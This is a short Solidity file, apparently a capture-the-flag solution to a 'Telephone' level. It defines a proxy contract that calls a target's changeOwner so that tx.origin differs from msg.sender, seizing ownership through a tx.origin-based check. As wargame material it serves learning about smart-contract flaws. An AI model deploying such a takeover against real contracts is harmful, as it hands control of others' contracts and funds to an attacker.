// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneProxy {
    Telephone private _telephoneInstance;

    constructor(address telephoneAddress) {
        _telephoneInstance = Telephone(telephoneAddress);
    }

    function takeOwnership() public {
        _telephoneInstance.changeOwner(msg.sender);
    }
}
